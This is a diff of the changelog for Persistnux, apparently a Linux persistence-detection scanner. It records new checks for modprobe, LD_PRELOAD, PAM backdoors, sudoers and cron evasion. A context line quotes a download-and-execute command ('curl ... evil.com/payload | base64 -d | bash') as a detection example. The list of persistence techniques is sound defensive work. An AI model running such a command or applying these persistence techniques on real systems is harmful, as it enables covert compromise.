@@ -5,6 +5,90 @@ All notable changes to Persistnux will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [2.2.0] - 2026-03-06
+
+### Added — Kernel/Preload Depth Expansion
+
+Four detection gaps in `check_kernel_and_preload()` and `/etc/environment` handling closed:
+
+**Gap A: `/etc/modprobe.d/` Coverage**
+- All files in `/etc/modprobe.d/` and `/etc/modprobe.conf` now passed to `is_package_managed()`
+- Modified package-owned modprobe config reported CRITICAL; unmanaged config reported MEDIUM
+- `install` directives extracted from each config: command target in suspicious location or unmanaged → CRITICAL; missing from disk → CRITICAL
+- `blacklist` of security modules (apparmor, selinux, seccomp, lockdown) → HIGH
+
+**Gap B: `ld.so.conf.d` Listed Paths → `.so` File Scan**
+- Paths extracted from `/etc/ld.so.conf` and `/etc/ld.so.conf.d/*` and scanned for `.so` files
+- Standard system lib dirs (`/usr/lib`, `/lib`, `/usr/lib64`, `/lib64`) excluded to avoid performance impact
+- Each `.so` file at a non-standard path passed to `is_package_managed()`; modified → CRITICAL, unmanaged → HIGH
+
+**Gap C: `/etc/environment` LD_PRELOAD Library Verification**
+- LD_PRELOAD/LD_LIBRARY_PATH values extracted from `/etc/environment` (absolute paths)
+- Each library path passed to `is_package_managed()`; unmanaged → CRITICAL, modified → CRITICAL, verified → LOW
+
+**Gap D: `/etc/modules-load.d` Referenced `.ko` File Verification**
+- Module names extracted from `/etc/modules` and `/etc/modules-load.d/*` configs
+- `modinfo -F filename` used to resolve each module name to `.ko` file path
+- Builtin modules and unresolvable names skipped gracefully
+- Modified package `.ko` → CRITICAL; unmanaged `.ko` in standard path → MEDIUM; `.ko` outside `/lib/modules/` → HIGH; module name not found via modinfo → MEDIUM
+
+---
+
+## [2.1.0] - 2026-03-06
+
+### Added — PAM Comprehensive Overhaul (16 gaps fixed across two sessions)
+
+**File Collection Refactor**
+- `_all_pam_files` array built from `/etc/pam.d/` + `@include` directive resolution (follows cross-directory includes, deduplicates)
+- `/etc/pam.conf` included as a PAM source file (legacy systems)
+- `/etc/pam.conf` lines stripped of leading service-name column before pattern matching
+
+**Config File Integrity**
+- Each file in `_all_pam_files` now passed to `is_package_managed()`
+- Modified package-owned PAM config → CRITICAL (`pam_config_modified`)
+- Unmanaged config branch dropped entirely (pam-auth-update generated files are not tracked by dpkg — false positive fix)
+
+**Module Detection Improvements**
+- pam_exec.so regex now handles bare-word flags (`expose_authtok`) and key=value options (`log=/file`) before the script path
+- Absolute-path `.so` module references (e.g., `auth required /opt/custom/pam_backdoor.so`) now extracted and verified separately
+- Dedup key changed from module name to resolved full path
+
+**New Relay Module Detection**
+- `pam_python.so` and `pam_perl.so`: script arguments extracted, passed to `is_package_managed()` and `analyze_script_content()`; missing → CRITICAL, suspicious location or content → CRITICAL
+- `pam_script.so`: hook files in `/etc/security/` scanned; suspicious content → CRITICAL, unmanaged hook → HIGH
+- pam_exec/relay location checks expanded to include `/run/user/` paths and hidden directory components
+
+**Confidence Escalation**
+- Unmanaged pam_exec scripts: default confidence raised from HIGH to CRITICAL
+- Relay module (pam_python/pam_perl) unmanaged scripts: default confidence raised to CRITICAL
+
+**New Scan Scopes**
+- `pam_env.conf` (`/etc/security/pam_env.conf`): scanned for `LD_PRELOAD` entries; unmanaged/modified library → CRITICAL
+- `~/.pam_environment` (per-user, root only): scanned for `LD_PRELOAD` entries; unmanaged library → CRITICAL
+- `/etc/security/`: all files passed to `is_package_managed()`; modified package files → CRITICAL; executable unmanaged files with suspicious content → HIGH
+
+---
+
+## [2.0.0] - 2026-03-05
+
+### Fixed — 13 Detection Bugs
+
+- **BUG-1: Cron field extraction**: `/etc/crontab` and `/etc/cron.d` command extraction corrected from field 6 to field 7 (field 6 is the username column); user crontab extraction unchanged
+- **BUG-2: UID filter excludes service accounts**: All four user-enumeration loops (systemd, cron, shell profiles, backdoor) now accept UID ≥ 0, ensuring service accounts with malicious persistence are not silently skipped
+- **BUG-3: Timer-activated service evasion**: Disabled services that have a matching `.timer` file in any systemd path are no longer skipped — the timer is what activates them, not the enabled state
+- **BUG-4: Location checks missing hidden dirs and `/run/user/`**: Script and binary location checks now flag paths with hidden directory components (`/\.[a-zA-Z]`) and `/run/user/` paths
+- **BUG-5: XDG autostart non-root user homes**: When running as root, XDG autostart scan now iterates all user home directories from `/etc/passwd`; non-existent homes skipped gracefully
+- **BUG-6: Entropy loop reads raw content**: Entropy analysis loop now reads `$script_content_clean` (comment-stripped), eliminating false positives from commented-out base64 examples
+- **BUG-7: Sudoers no content analysis**: `/etc/sudoers` and all `/etc/sudoers.d/` drop-ins now analyzed for `NOPASSWD` and `ALL` patterns; findings with these patterns escalated to HIGH
+- **BUG-8: Non-root shell profile confidence**: Results from `quick_suspicious_check()` and `analyze_script_content()` on non-root shell profiles now correctly report HIGH (previously remained MEDIUM)
+- **BUG-9: Web file counter non-functional**: `head -100` with `-print0` was silently ignored; replaced with explicit counter — webshell scan now reliably stops at 100 files
+- **BUG-10: MOTD no package verification**: MOTD scripts now call `is_package_managed()` before content analysis; modified package-owned MOTD → CRITICAL
+- **BUG-12: Pacman verify false positives**: `pacman -V` output grep now uses space-prefixed match (`" $file"`) to prevent substring matches against longer paths
+- **BUG-13: `env -S` / `--split-string` evasion**: `analyze_inline_code()` now extracts code from `env -S` / `env --split-string` arguments; all three inline-code detection gates (systemd, cron, XDG) updated to trigger on this pattern
+- **BUG-14: Non-root git config no content analysis**: `~/.gitconfig` for non-root users now analyzed for `credential.helper` and suspicious patterns; previously always returned LOW
+
+---
+
 ## [1.9.0] - 2026-02-21
 
 ### Removed
@@ -541,6 +625,9 @@ curl -s http://evil.com/payload | base64 -d | bash
 
 ## Version History Summary
 
+- **v2.2.0**: Kernel/preload depth — modprobe.d coverage, ld.so.conf.d .so scan, /etc/environment LD_PRELOAD library verification, modules-load.d .ko verification
+- **v2.1.0**: PAM comprehensive overhaul — 16 gaps fixed, relay detection, @include following, /etc/security/ scan
+- **v2.0.0**: 13 detection bug fixes — cron field extraction, timer-activated services, service accounts, location checks, sudoers analysis, env -S evasion
 - **v1.9.0**: Removed SSH detection, rewrote PAM detection, enhanced matched_string output
 - **v1.7.x**: Interpreter detection, package verification, entropy analysis
 - **v1.6.0**: Package integrity verification, entropy-based obfuscation detection
